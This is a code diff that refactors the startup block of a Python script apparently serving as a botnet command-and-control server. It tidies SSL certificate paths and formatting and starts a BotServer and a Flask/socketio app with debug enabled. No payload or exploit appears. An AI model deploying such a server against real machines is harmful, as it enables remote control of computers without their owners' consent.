@@ -310,7 +310,7 @@ if __name__ == "__main__":
     CERT_FILE = "cert.pem"
     KEY_FILE = "key.pem"
 
-    if (USE_SSL_BOTS or USE_SSL_FLASK):
+    if USE_SSL_BOTS or USE_SSL_FLASK:
         create_self_signed_cert(CERT_FILE, KEY_FILE,
                                 certargs=
                                 {"Country": "US",
@@ -319,14 +319,16 @@ if __name__ == "__main__":
                                  "Organization": "CHC",
                                  "Org. Unit": "Side-Projects"},
                                 cert_dir=CERT_DIR)
-        if (sys.version_info.major, sys.version_info.minor) >= (3,6):
-            print("[!] There is a known bug with SSL and eventlet/Python 3.6,\n\ttry a different python version or turn off SSL")
+        CERT_FILE = os.path.join(CERT_DIR, CERT_FILE)
+        KEY_FILE = os.path.join(CERT_DIR, KEY_FILE)
 
-    botnet = BotNet(socketio,downloadpath=DOWNLOAD_FOLDER)
+        if (sys.version_info.major, sys.version_info.minor) >= (3,6):
+            print("[!] There is a known bug with SSL and eventlet/Python 3.6,\n" +
+                  "\ttry a different python version or turn off SSL")
+
+    botnet = BotNet(socketio, downloadpath=DOWNLOAD_FOLDER)
     if USE_SSL_BOTS:
-        botserver = BotServer(botnet, socketio,
-                              certfile=os.path.join(CERT_DIR,CERT_FILE),
-                              keyfile=os.path.join(CERT_DIR,KEY_FILE))
+        botserver = BotServer(botnet, socketio, certfile=CERT_FILE, keyfile=KEY_FILE)
     else:
         botserver = BotServer(botnet, socketio)
 
@@ -334,8 +336,6 @@ if __name__ == "__main__":
     botserver.start()
 
     if USE_SSL_FLASK:
-        CERT_FILE = os.path.join(CERT_DIR,CERT_FILE)
-        KEY_FILE = os.path.join(CERT_DIR,KEY_FILE)
         socketio.run(app, debug=True, use_reloader=False, certfile=CERT_FILE, keyfile=KEY_FILE, port=5500)
     else:
         socketio.run(app, debug=True, use_reloader=False, port=5500)
